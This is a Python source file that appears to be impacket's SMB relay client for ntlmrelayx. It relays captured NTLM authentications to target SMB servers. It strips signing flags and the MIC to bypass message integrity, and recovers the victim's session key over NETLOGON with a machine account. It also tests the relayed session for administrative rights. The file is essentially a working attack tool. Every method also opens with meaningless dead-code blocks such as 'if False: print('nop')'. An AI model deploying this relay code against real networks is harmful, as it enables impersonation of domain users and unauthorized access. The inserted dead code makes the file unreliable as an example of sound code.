import logging
import os
from binascii import unhexlify, hexlify
from struct import unpack, pack
from socket import error as socketerror
from impacket.dcerpc.v5.rpcrt import DCERPCException
from impacket.dcerpc.v5 import nrpc
from impacket.dcerpc.v5 import transport
from impacket.dcerpc.v5.ndr import NULL
from impacket import LOG
from impacket.examples.ntlmrelayx.clients import ProtocolClient
from impacket.examples.ntlmrelayx.servers.socksserver import KEEP_ALIVE_TIMER
from impacket.nt_errors import STATUS_SUCCESS, STATUS_ACCESS_DENIED, STATUS_LOGON_FAILURE
from impacket.ntlm import NTLMAuthNegotiate, NTLMSSP_NEGOTIATE_ALWAYS_SIGN, NTLMAuthChallenge, NTLMAuthChallengeResponse, generateEncryptedSessionKey, hmac_md5
from impacket.smb import SMB, NewSMBPacket, SMBCommand, SMBSessionSetupAndX_Extended_Parameters, SMBSessionSetupAndX_Extended_Data, SMBSessionSetupAndX_Extended_Response_Data, SMBSessionSetupAndX_Extended_Response_Parameters, SMBSessionSetupAndX_Data, SMBSessionSetupAndX_Parameters
from impacket.smb3 import SMB3, SMB2_GLOBAL_CAP_ENCRYPTION, SMB2_DIALECT_WILDCARD, SMB2Negotiate_Response, SMB2_NEGOTIATE, SMB2Negotiate, SMB2_DIALECT_002, SMB2_DIALECT_21, SMB2_DIALECT_30, SMB2_GLOBAL_CAP_LEASING, SMB3Packet, SMB2_GLOBAL_CAP_LARGE_MTU, SMB2_GLOBAL_CAP_DIRECTORY_LEASING, SMB2_GLOBAL_CAP_MULTI_CHANNEL, SMB2_GLOBAL_CAP_PERSISTENT_HANDLES, SMB2_NEGOTIATE_SIGNING_REQUIRED, SMB2Packet, SMB2SessionSetup, SMB2_SESSION_SETUP, STATUS_MORE_PROCESSING_REQUIRED, SMB2SessionSetup_Response
from impacket.smbconnection import SMBConnection, SMB_DIALECT
from impacket.ntlm import NTLMAuthChallenge, NTLMAuthNegotiate, NTLMSSP_NEGOTIATE_SIGN, NTLMSSP_NEGOTIATE_ALWAYS_SIGN, NTLMAuthChallengeResponse, NTLMSSP_NEGOTIATE_KEY_EXCH, NTLMSSP_NEGOTIATE_VERSION
from impacket.spnego import SPNEGO_NegTokenInit, SPNEGO_NegTokenResp, TypesMech
from impacket.dcerpc.v5.transport import SMBTransport
from impacket.dcerpc.v5 import scmr
PROTOCOL_CLIENT_CLASS = 'SMBRelayClient'

class MYSMB(SMB):

    def __init__(self, remoteName, sessPort=445, extendedSecurity=True, nmbSession=None, negPacket=None):
        if False:
            i = 10
            return i + 15
        self.extendedSecurity = extendedSecurity
        SMB.__init__(self, remoteName, remoteName, sess_port=sessPort, session=nmbSession, negPacket=negPacket)

    def neg_session(self, negPacket=None):
        if False:
            while True:
                i = 10
        return SMB.neg_session(self, extended_security=self.extendedSecurity, negPacket=negPacket)

class MYSMB3(SMB3):

    def __init__(self, remoteName, sessPort=445, extendedSecurity=True, nmbSession=None, negPacket=None, preferredDialect=None):
        if False:
            for i in range(10):
                print('nop')
        self.extendedSecurity = extendedSecurity
        SMB3.__init__(self, remoteName, remoteName, sess_port=sessPort, session=nmbSession, negSessionResponse=SMB2Packet(negPacket), preferredDialect=preferredDialect)

    def negotiateSession(self, preferredDialect=None, negSessionResponse=None):
        if False:
            for i in range(10):
                print('nop')
        self._Connection['ClientSecurityMode'] = 0
        if self.RequireMessageSigning is True:
            LOG.error("Signing is required, attack won't work unless using -remove-target / --remove-mic")
            return
        self._Connection['Capabilities'] = SMB2_GLOBAL_CAP_ENCRYPTION
        currentDialect = SMB2_DIALECT_WILDCARD
        if negSessionResponse is not None:
            negResp = SMB2Negotiate_Response(negSessionResponse['Data'])
            currentDialect = negResp['DialectRevision']
        if currentDialect == SMB2_DIALECT_WILDCARD:
            packet = self.SMB_PACKET()
            packet['Command'] = SMB2_NEGOTIATE
            negSession = SMB2Negotiate()
            negSession['SecurityMode'] = self._Connection['ClientSecurityMode']
            negSession['Capabilities'] = self._Connection['Capabilities']
            negSession['ClientGuid'] = self.ClientGuid
            if preferredDialect is not None:
                negSession['Dialects'] = [preferredDialect]
            else:
                negSession['Dialects'] = [SMB2_DIALECT_002, SMB2_DIALECT_21, SMB2_DIALECT_30]
            negSession['DialectCount'] = len(negSession['Dialects'])
            packet['Data'] = negSession
            packetID = self.sendSMB(packet)
            ans = self.recvSMB(packetID)
            if ans.isValidAnswer(STATUS_SUCCESS):
                negResp = SMB2Negotiate_Response(ans['Data'])
        self._Connection['MaxTransactSize'] = min(1048576, negResp['MaxTransactSize'])
        self._Connection['MaxReadSize'] = min(1048576, negResp['MaxReadSize'])
        self._Connection['MaxWriteSize'] = min(1048576, negResp['MaxWriteSize'])
        self._Connection['ServerGuid'] = negResp['ServerGuid']
        self._Connection['GSSNegotiateToken'] = negResp['Buffer']
        self._Connection['Dialect'] = negResp['DialectRevision']
        if negResp['SecurityMode'] & SMB2_NEGOTIATE_SIGNING_REQUIRED == SMB2_NEGOTIATE_SIGNING_REQUIRED:
            LOG.error("Signing is required, attack won't work unless using -remove-target / --remove-mic")
            return
        if negResp['Capabilities'] & SMB2_GLOBAL_CAP_LEASING == SMB2_GLOBAL_CAP_LEASING:
            self._Connection['SupportsFileLeasing'] = True
        if negResp['Capabilities'] & SMB2_GLOBAL_CAP_LARGE_MTU == SMB2_GLOBAL_CAP_LARGE_MTU:
            self._Connection['SupportsMultiCredit'] = True
        if self._Connection['Dialect'] == SMB2_DIALECT_30:
            self.SMB_PACKET = SMB3Packet
            if negResp['Capabilities'] & SMB2_GLOBAL_CAP_DIRECTORY_LEASING == SMB2_GLOBAL_CAP_DIRECTORY_LEASING:
                self._Connection['SupportsDirectoryLeasing'] = True
            if negResp['Capabilities'] & SMB2_GLOBAL_CAP_MULTI_CHANNEL == SMB2_GLOBAL_CAP_MULTI_CHANNEL:
                self._Connection['SupportsMultiChannel'] = True
            if negResp['Capabilities'] & SMB2_GLOBAL_CAP_PERSISTENT_HANDLES == SMB2_GLOBAL_CAP_PERSISTENT_HANDLES:
                self._Connection['SupportsPersistentHandles'] = True
            if negResp['Capabilities'] & SMB2_GLOBAL_CAP_ENCRYPTION == SMB2_GLOBAL_CAP_ENCRYPTION:
                self._Connection['SupportsEncryption'] = True
            self._Connection['ServerCapabilities'] = negResp['Capabilities']
            self._Connection['ServerSecurityMode'] = negResp['SecurityMode']

class SMBRelayClient(ProtocolClient):
    PLUGIN_NAME = 'SMB'

    def __init__(self, serverConfig, target, targetPort=445, extendedSecurity=True):
        if False:
            print('Hello World!')
        ProtocolClient.__init__(self, serverConfig, target, targetPort, extendedSecurity)
        self.extendedSecurity = extendedSecurity
        self.machineAccount = None
        self.machineHashes = None
        self.sessionData = {}
        self.negotiateMessage = None
        self.challengeMessage = None
        self.serverChallenge = None
        self.keepAliveHits = 1

    def netlogonSessionKey(self, authenticateMessageBlob):
        if False:
            return 10
        logging.info('Connecting to %s NETLOGON service' % self.serverConfig.domainIp)
        authenticateMessage = NTLMAuthChallengeResponse()
        authenticateMessage.fromString(authenticateMessageBlob)
        (_, machineAccount) = self.serverConfig.machineAccount.split('/')
        domainName = authenticateMessage['domain_name'].decode('utf-16le')
        try:
            serverName = machineAccount[:len(machineAccount) - 1]
        except:
            return STATUS_ACCESS_DENIED
        stringBinding = 'ncacn_np:%s[\\PIPE\\netlogon]' % self.serverConfig.domainIp
        rpctransport = transport.DCERPCTransportFactory(stringBinding)
        if len(self.serverConfig.machineHashes) > 0:
            (lmhash, nthash) = self.serverConfig.machineHashes.split(':')
        else:
            lmhash = ''
            nthash = ''
        if hasattr(rpctransport, 'set_credentials'):
            rpctransport.set_credentials(machineAccount, '', domainName, lmhash, nthash)
        dce = rpctransport.get_dce_rpc()
        dce.connect()
        dce.bind(nrpc.MSRPC_UUID_NRPC)
        resp = nrpc.hNetrServerReqChallenge(dce, NULL, serverName + '\x00', b'12345678')
        serverChallenge = resp['ServerChallenge']
        if self.serverConfig.machineHashes == '':
            ntHash = None
        else:
            ntHash = unhexlify(self.serverConfig.machineHashes.split(':')[1])
        sessionKey = nrpc.ComputeSessionKeyStrongKey('', b'12345678', serverChallenge, ntHash)
        ppp = nrpc.ComputeNetlogonCredential(b'12345678', sessionKey)
        nrpc.hNetrServerAuthenticate3(dce, NULL, machineAccount + '\x00', nrpc.NETLOGON_SECURE_CHANNEL_TYPE.WorkstationSecureChannel, serverName + '\x00', ppp, 1611661311)
        clientStoredCredential = pack('<Q', unpack('<Q', ppp)[0] + 10)
        request = nrpc.NetrLogonSamLogonWithFlags()
        request['LogonServer'] = '\x00'
        request['ComputerName'] = serverName + '\x00'
        request['ValidationLevel'] = nrpc.NETLOGON_VALIDATION_INFO_CLASS.NetlogonValidationSamInfo4
        request['LogonLevel'] = nrpc.NETLOGON_LOGON_INFO_CLASS.NetlogonNetworkTransitiveInformation
        request['LogonInformation']['tag'] = nrpc.NETLOGON_LOGON_INFO_CLASS.NetlogonNetworkTransitiveInformation
        request['LogonInformation']['LogonNetworkTransitive']['Identity']['LogonDomainName'] = domainName
        request['LogonInformation']['LogonNetworkTransitive']['Identity']['ParameterControl'] = 0
        request['LogonInformation']['LogonNetworkTransitive']['Identity']['UserName'] = authenticateMessage['user_name'].decode('utf-16le')
        request['LogonInformation']['LogonNetworkTransitive']['Identity']['Workstation'] = ''
        request['LogonInformation']['LogonNetworkTransitive']['LmChallenge'] = self.serverChallenge
        request['LogonInformation']['LogonNetworkTransitive']['NtChallengeResponse'] = authenticateMessage['ntlm']
        request['LogonInformation']['LogonNetworkTransitive']['LmChallengeResponse'] = authenticateMessage['lanman']
        authenticator = nrpc.NETLOGON_AUTHENTICATOR()
        authenticator['Credential'] = nrpc.ComputeNetlogonCredential(clientStoredCredential, sessionKey)
        authenticator['Timestamp'] = 10
        request['Authenticator'] = authenticator
        request['ReturnAuthenticator']['Credential'] = b'\x00' * 8
        request['ReturnAuthenticator']['Timestamp'] = 0
        request['ExtraFlags'] = 0
        try:
            resp = dce.request(request)
        except DCERPCException as e:
            if logging.getLogger().level == logging.DEBUG:
                import traceback
                traceback.print_exc()
            logging.error(str(e))
            return e.get_error_code()
        logging.info('%s\\%s successfully validated through NETLOGON' % (domainName, authenticateMessage['user_name'].decode('utf-16le')))
        encryptedSessionKey = authenticateMessage['session_key']
        if encryptedSessionKey != b'':
            signingKey = generateEncryptedSessionKey(resp['ValidationInformation']['ValidationSam4']['UserSessionKey'], encryptedSessionKey)
        else:
            signingKey = resp['ValidationInformation']['ValidationSam4']['UserSessionKey']
        logging.info('SMB Signing key: %s ' % hexlify(signingKey).decode('utf-8'))
        return (STATUS_SUCCESS, signingKey)

    def keepAlive(self):
        if False:
            return 10
        if self.keepAliveHits >= 250 / KEEP_ALIVE_TIMER:
            tid = self.session.connectTree('IPC$')
            self.session.disconnectTree(tid)
            self.keepAliveHits = 1
        else:
            self.keepAliveHits += 1

    def killConnection(self):
        if False:
            while True:
                i = 10
        if self.session is not None:
            self.session.close()
            self.session = None

    def initConnection(self):
        if False:
            for i in range(10):
                print('nop')
        self.session = SMBConnection(self.targetHost, self.targetHost, sess_port=self.targetPort, manualNegotiate=True)
        if self.serverConfig.smb2support is True:
            data = '\x02NT LM 0.12\x00\x02SMB 2.002\x00\x02SMB 2.???\x00'
        else:
            data = '\x02NT LM 0.12\x00'
        if self.extendedSecurity is True:
            flags2 = SMB.FLAGS2_EXTENDED_SECURITY | SMB.FLAGS2_NT_STATUS | SMB.FLAGS2_LONG_NAMES
        else:
            flags2 = SMB.FLAGS2_NT_STATUS | SMB.FLAGS2_LONG_NAMES
        try:
            packet = self.session.negotiateSessionWildcard(None, self.targetHost, self.targetHost, self.targetPort, 60, self.extendedSecurity, flags1=SMB.FLAGS1_PATHCASELESS | SMB.FLAGS1_CANONICALIZED_PATHS, flags2=flags2, data=data)
        except Exception as e:
            if not self.serverConfig.smb2support:
                LOG.error('SMBClient error: Connection was reset. Possibly the target has SMBv1 disabled. Try running ntlmrelayx with -smb2support')
            else:
                LOG.error('SMBClient error: Connection was reset')
            return False
        if packet[0:1] == b'\xfe':
            preferredDialect = None
            if self.serverConfig.remove_target:
                preferredDialect = SMB2_DIALECT_21
            smbClient = MYSMB3(self.targetHost, self.targetPort, self.extendedSecurity, nmbSession=self.session.getNMBServer(), negPacket=packet, preferredDialect=preferredDialect)
        else:
            smbClient = MYSMB(self.targetHost, self.targetPort, self.extendedSecurity, nmbSession=self.session.getNMBServer(), negPacket=packet)
        self.session = SMBConnection(self.targetHost, self.targetHost, sess_port=self.targetPort, existingConnection=smbClient, manualNegotiate=True)
        return True

    def setUid(self, uid):
        if False:
            i = 10
            return i + 15
        self._uid = uid

    def sendNegotiate(self, negotiateMessage):
        if False:
            while True:
                i = 10
        negoMessage = NTLMAuthNegotiate()
        negoMessage.fromString(negotiateMessage)
        if self.serverConfig.remove_mic:
            if negoMessage['flags'] & NTLMSSP_NEGOTIATE_SIGN == NTLMSSP_NEGOTIATE_SIGN:
                negoMessage['flags'] ^= NTLMSSP_NEGOTIATE_SIGN
            if negoMessage['flags'] & NTLMSSP_NEGOTIATE_ALWAYS_SIGN == NTLMSSP_NEGOTIATE_ALWAYS_SIGN:
                negoMessage['flags'] ^= NTLMSSP_NEGOTIATE_ALWAYS_SIGN
            if negoMessage['flags'] & NTLMSSP_NEGOTIATE_KEY_EXCH == NTLMSSP_NEGOTIATE_KEY_EXCH:
                negoMessage['flags'] ^= NTLMSSP_NEGOTIATE_KEY_EXCH
            if negoMessage['flags'] & NTLMSSP_NEGOTIATE_VERSION == NTLMSSP_NEGOTIATE_VERSION:
                negoMessage['flags'] ^= NTLMSSP_NEGOTIATE_VERSION
        negotiateMessage = negoMessage.getData()
        challenge = NTLMAuthChallenge()
        if self.session.getDialect() == SMB_DIALECT:
            challenge.fromString(self.sendNegotiatev1(negotiateMessage))
        else:
            challenge.fromString(self.sendNegotiatev2(negotiateMessage))
        self.negotiateMessage = negotiateMessage
        self.challengeMessage = challenge.getData()
        self.sessionData['CHALLENGE_MESSAGE'] = challenge
        self.serverChallenge = challenge['challenge']
        return challenge

    def sendNegotiatev2(self, negotiateMessage):
        if False:
            for i in range(10):
                print('nop')
        v2client = self.session.getSMBServer()
        sessionSetup = SMB2SessionSetup()
        sessionSetup['Flags'] = 0
        sessionSetup['SecurityBufferLength'] = len(negotiateMessage)
        sessionSetup['Buffer'] = negotiateMessage
        packet = v2client.SMB_PACKET()
        packet['Command'] = SMB2_SESSION_SETUP
        packet['Data'] = sessionSetup
        packetID = v2client.sendSMB(packet)
        ans = v2client.recvSMB(packetID)
        if ans.isValidAnswer(STATUS_MORE_PROCESSING_REQUIRED):
            v2client._Session['SessionID'] = ans['SessionID']
            sessionSetupResponse = SMB2SessionSetup_Response(ans['Data'])
            return sessionSetupResponse['Buffer']
        return False

    def sendNegotiatev1(self, negotiateMessage):
        if False:
            print('Hello World!')
        v1client = self.session.getSMBServer()
        smb = NewSMBPacket()
        smb['Flags1'] = SMB.FLAGS1_PATHCASELESS
        smb['Flags2'] = SMB.FLAGS2_EXTENDED_SECURITY
        if v1client.is_signing_required():
            smb['Flags2'] |= SMB.FLAGS2_SMB_SECURITY_SIGNATURE
        flags2 = v1client.get_flags()[1]
        v1client.set_flags(flags2=flags2 & ~SMB.FLAGS2_UNICODE)
        sessionSetup = SMBCommand(SMB.SMB_COM_SESSION_SETUP_ANDX)
        sessionSetup['Parameters'] = SMBSessionSetupAndX_Extended_Parameters()
        sessionSetup['Data'] = SMBSessionSetupAndX_Extended_Data()
        sessionSetup['Parameters']['MaxBufferSize'] = 65535
        sessionSetup['Parameters']['MaxMpxCount'] = 2
        sessionSetup['Parameters']['VcNumber'] = 1
        sessionSetup['Parameters']['SessionKey'] = 0
        sessionSetup['Parameters']['Capabilities'] = SMB.CAP_EXTENDED_SECURITY | SMB.CAP_USE_NT_ERRORS | SMB.CAP_UNICODE
        sessionSetup['Parameters']['SecurityBlobLength'] = len(negotiateMessage)
        sessionSetup['Parameters'].getData()
        sessionSetup['Data']['SecurityBlob'] = negotiateMessage
        sessionSetup['Data']['NativeOS'] = 'Unix'
        sessionSetup['Data']['NativeLanMan'] = 'Samba'
        smb.addCommand(sessionSetup)
        v1client.sendSMB(smb)
        smb = v1client.recvSMB()
        try:
            smb.isValidAnswer(SMB.SMB_COM_SESSION_SETUP_ANDX)
        except Exception:
            LOG.error('SessionSetup Error!')
            raise
        else:
            v1client.set_uid(smb['Uid'])
            sessionResponse = SMBCommand(smb['Data'][0])
            sessionParameters = SMBSessionSetupAndX_Extended_Response_Parameters(sessionResponse['Parameters'])
            sessionData = SMBSessionSetupAndX_Extended_Response_Data(flags=smb['Flags2'])
            sessionData['SecurityBlobLength'] = sessionParameters['SecurityBlobLength']
            sessionData.fromString(sessionResponse['Data'])
            return sessionData['SecurityBlob']

    def sendStandardSecurityAuth(self, sessionSetupData):
        if False:
            for i in range(10):
                print('nop')
        v1client = self.session.getSMBServer()
        flags2 = v1client.get_flags()[1]
        v1client.set_flags(flags2=flags2 & ~SMB.FLAGS2_EXTENDED_SECURITY)
        if sessionSetupData['Account'] != '':
            smb = NewSMBPacket()
            smb['Flags1'] = 8
            sessionSetup = SMBCommand(SMB.SMB_COM_SESSION_SETUP_ANDX)
            sessionSetup['Parameters'] = SMBSessionSetupAndX_Parameters()
            sessionSetup['Data'] = SMBSessionSetupAndX_Data()
            sessionSetup['Parameters']['MaxBuffer'] = 65535
            sessionSetup['Parameters']['MaxMpxCount'] = 2
            sessionSetup['Parameters']['VCNumber'] = os.getpid()
            sessionSetup['Parameters']['SessionKey'] = v1client._dialects_parameters['SessionKey']
            sessionSetup['Parameters']['AnsiPwdLength'] = len(sessionSetupData['AnsiPwd'])
            sessionSetup['Parameters']['UnicodePwdLength'] = len(sessionSetupData['UnicodePwd'])
            sessionSetup['Parameters']['Capabilities'] = SMB.CAP_RAW_MODE
            sessionSetup['Data']['AnsiPwd'] = sessionSetupData['AnsiPwd']
            sessionSetup['Data']['UnicodePwd'] = sessionSetupData['UnicodePwd']
            sessionSetup['Data']['Account'] = sessionSetupData['Account']
            sessionSetup['Data']['PrimaryDomain'] = sessionSetupData['PrimaryDomain']
            sessionSetup['Data']['NativeOS'] = 'Unix'
            sessionSetup['Data']['NativeLanMan'] = 'Samba'
            smb.addCommand(sessionSetup)
            v1client.sendSMB(smb)
            smb = v1client.recvSMB()
            try:
                smb.isValidAnswer(SMB.SMB_COM_SESSION_SETUP_ANDX)
            except:
                return (None, STATUS_LOGON_FAILURE)
            else:
                v1client.set_uid(smb['Uid'])
                return (smb, STATUS_SUCCESS)
        else:
            clientResponse = None
            errorCode = STATUS_ACCESS_DENIED
        return (clientResponse, errorCode)

    def sendAuth(self, authenticateMessageBlob, serverChallenge=None):
        if False:
            i = 10
            return i + 15
        if self.serverConfig.remove_mic:
            authMessage = NTLMAuthChallengeResponse()
            authMessage.fromString(authenticateMessageBlob)
            if authMessage['flags'] & NTLMSSP_NEGOTIATE_SIGN == NTLMSSP_NEGOTIATE_SIGN:
                authMessage['flags'] ^= NTLMSSP_NEGOTIATE_SIGN
            if authMessage['flags'] & NTLMSSP_NEGOTIATE_ALWAYS_SIGN == NTLMSSP_NEGOTIATE_ALWAYS_SIGN:
                authMessage['flags'] ^= NTLMSSP_NEGOTIATE_ALWAYS_SIGN
            if authMessage['flags'] & NTLMSSP_NEGOTIATE_KEY_EXCH == NTLMSSP_NEGOTIATE_KEY_EXCH:
                authMessage['flags'] ^= NTLMSSP_NEGOTIATE_KEY_EXCH
            if authMessage['flags'] & NTLMSSP_NEGOTIATE_VERSION == NTLMSSP_NEGOTIATE_VERSION:
                authMessage['flags'] ^= NTLMSSP_NEGOTIATE_VERSION
            authMessage['MIC'] = b''
            authMessage['MICLen'] = 0
            authMessage['Version'] = b''
            authMessage['VersionLen'] = 0
            authenticateMessageBlob = authMessage.getData()
        authData = authenticateMessageBlob
        signingKey = None
        if self.serverConfig.remove_target:
            authenticateMessageBlob = authData
            (errorCode, signingKey) = self.netlogonSessionKey(authData)
            res = NTLMAuthChallengeResponse()
            res.fromString(authenticateMessageBlob)
            newAuthBlob = authenticateMessageBlob[0:72] + b'\x00' * 16 + authenticateMessageBlob[88:]
            relay_MIC = hmac_md5(signingKey, self.negotiateMessage + self.challengeMessage + newAuthBlob)
            respToken2 = SPNEGO_NegTokenResp()
            respToken2['ResponseToken'] = authenticateMessageBlob[0:72] + relay_MIC + authenticateMessageBlob[88:]
            authData = authenticateMessageBlob[0:72] + relay_MIC + authenticateMessageBlob[88:]
        if self.session.getDialect() == SMB_DIALECT:
            (token, errorCode) = self.sendAuthv1(authData, serverChallenge)
        else:
            (token, errorCode) = self.sendAuthv2(authData, serverChallenge)
        if signingKey:
            logging.info('Enabling session signing')
            self.session._SMBConnection.set_session_key(signingKey)
        return (token, errorCode)

    def sendAuthv2(self, authenticateMessageBlob, serverChallenge=None):
        if False:
            print('Hello World!')
        if unpack('B', authenticateMessageBlob[:1])[0] == SPNEGO_NegTokenResp.SPNEGO_NEG_TOKEN_RESP:
            respToken = SPNEGO_NegTokenResp(authenticateMessageBlob)
            authData = respToken['ResponseToken']
        else:
            authData = authenticateMessageBlob
        v2client = self.session.getSMBServer()
        sessionSetup = SMB2SessionSetup()
        sessionSetup['Flags'] = 0
        packet = v2client.SMB_PACKET()
        packet['Command'] = SMB2_SESSION_SETUP
        packet['Data'] = sessionSetup
        sessionSetup['SecurityBufferLength'] = len(authData)
        sessionSetup['Buffer'] = authData
        packetID = v2client.sendSMB(packet)
        packet = v2client.recvSMB(packetID)
        return (packet, packet['Status'])

    def sendAuthv1(self, authenticateMessageBlob, serverChallenge=None):
        if False:
            for i in range(10):
                print('nop')
        if unpack('B', authenticateMessageBlob[:1])[0] == SPNEGO_NegTokenResp.SPNEGO_NEG_TOKEN_RESP:
            respToken = SPNEGO_NegTokenResp(authenticateMessageBlob)
            authData = respToken['ResponseToken']
        else:
            authData = authenticateMessageBlob
        v1client = self.session.getSMBServer()
        smb = NewSMBPacket()
        smb['Flags1'] = SMB.FLAGS1_PATHCASELESS
        smb['Flags2'] = SMB.FLAGS2_EXTENDED_SECURITY | SMB.FLAGS2_UNICODE
        if v1client.is_signing_required():
            smb['Flags2'] |= SMB.FLAGS2_SMB_SECURITY_SIGNATURE
        smb['Uid'] = v1client.get_uid()
        sessionSetup = SMBCommand(SMB.SMB_COM_SESSION_SETUP_ANDX)
        sessionSetup['Parameters'] = SMBSessionSetupAndX_Extended_Parameters()
        sessionSetup['Data'] = SMBSessionSetupAndX_Extended_Data()
        sessionSetup['Parameters']['MaxBufferSize'] = 65535
        sessionSetup['Parameters']['MaxMpxCount'] = 2
        sessionSetup['Parameters']['VcNumber'] = 1
        sessionSetup['Parameters']['SessionKey'] = 0
        sessionSetup['Parameters']['Capabilities'] = SMB.CAP_EXTENDED_SECURITY | SMB.CAP_USE_NT_ERRORS | SMB.CAP_UNICODE
        sessionSetup['Data']['NativeOS'] = 'Unix'
        sessionSetup['Data']['NativeLanMan'] = 'Samba'
        sessionSetup['Parameters']['SecurityBlobLength'] = len(authData)
        sessionSetup['Data']['SecurityBlob'] = authData
        smb.addCommand(sessionSetup)
        v1client.sendSMB(smb)
        smb = v1client.recvSMB()
        errorCode = smb['ErrorCode'] << 16
        errorCode += smb['_reserved'] << 8
        errorCode += smb['ErrorClass']
        return (smb, errorCode)

    def getStandardSecurityChallenge(self):
        if False:
            i = 10
            return i + 15
        if self.session.getDialect() == SMB_DIALECT:
            return self.session.getSMBServer().get_encryption_key()
        else:
            return None

    def isAdmin(self):
        if False:
            print('Hello World!')
        rpctransport = SMBTransport(self.session.getRemoteHost(), 445, '\\svcctl', smb_connection=self.session)
        dce = rpctransport.get_dce_rpc()
        try:
            dce.connect()
        except:
            pass
        else:
            dce.bind(scmr.MSRPC_UUID_SCMR)
            try:
                ans = scmr.hROpenSCManagerW(dce, '{}\x00'.format(self.target.hostname), 'ServicesActive\x00', 983103)
                return 'TRUE'
            except scmr.DCERPCException as e:
                pass
        return 'FALSE'